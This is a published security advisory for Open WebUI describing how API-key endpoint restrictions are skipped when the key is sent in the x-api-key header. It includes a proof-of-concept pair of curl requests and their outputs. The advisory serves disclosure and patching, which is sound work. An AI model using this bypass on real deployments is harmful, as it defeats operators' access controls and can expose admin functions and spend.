# [M] Open WebUI's API key endpoint restrictions bypassed via `x-api-key` header — full message processing on restricted endpoints

## Summary
Severity: Medium
Advisory: GHSA-57q6-fvp4-pqmm
CVE: CVE-2026-45339
CWE: CWE-863
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-57q6-fvp4-pqmm
Type: github-advisory

## Affected
- PyPI: `open-webu` — affected >=0 <0.9.0

## Details
### Summary

Open WebUI allows admins to restrict which API endpoints an API key can access. When an API key is restricted from `/api/v1/messages`, requests using the `Authorization: Bearer sk-...` header are correctly blocked with 403. However, the same key sent via the `x-api-key` header bypasses the restriction entirely — the request is authenticated, the model is invoked, and a full response is returned.

### Details

Open WebUI's Anthropic-compatible API path accepts authentication via `x-api-key` header (standard for the Anthropic API). The endpoint restriction check only applies to keys presented via the `Authorization` header. When the same `sk-...` key is supplied in `x-api-key`, the restriction check is skipped but the key is still valid for authentication.

This means any API key, regardless of its configured endpoint restrictions, can access any API endpoint by simply using `x-api-key` instead of `Authorization`.

### PoC

**Verified against Open WebUI v0.8.11.**

**Setup:** Admin creates a user with an API key that has endpoint restrictions (not allowed on `/api/v1/messages`). A mock OpenAI-compatible model (`mock-model`) is configured.

```bash
API_KEY="sk-dc56016d720e49ba9e95584d602b79bb"

# Test 1: Authorization header — BLOCKED (endpoint restriction enforced)
curl -s -X POST http://target:8080/api/v1/messages \
  -H "Authorization: Bearer $API_KEY" \
  -H 'Content-Type: application/json' \
  -d '{"model":"mock-model","messages":[{"role":"user","content":"via Authorization header"}]}'

# Test 2: x-api-key header — BYPASS (same key, restriction skipped)
curl -s -X POST http://target:8080/api/v1/messages \
  -H "x-api-key: $API_KEY" \
  -H 'Content-Type: application/json' \
  -d '{"model":"mock-model","messages":[{"role":"user","content":"via x-api-key header"}]}'
```

**Verified output:**

```
# Authorization header:
{"detail":"API key not allowed to access this endpoint."}

# x-api-key header (SAME key):
{"id":"chatcmpl-mock","type":"message","role":"assistant","content":[{"type":"text","text":"MOCK-CHAT-RESPONSE"}],"model":"mock-model","usage":{"input_tokens":1,"output_tokens":1}}
```

The same API key is rejected via `Authorization` (403) but fully processed via `x-api-key` (200 with model response).

### Impact

Any API key with endpoint restrictions can bypass those restrictions by using the `x-api-key` header instead of `Authorization`. This undermines the entire API key permission model:

- Keys restricted from chat/completion endpoints can still send messages and receive LLM responses
- Keys restricted from admin endpoints may access admin functionality
- The operator's intended access control is silently ineffective
- API credit spend cannot be controlled through endpoint restrictions

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-57q6-fvp4-pqmm
- https://nvd.nist.gov/vuln/detail/CVE-2026-45339
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.9.0
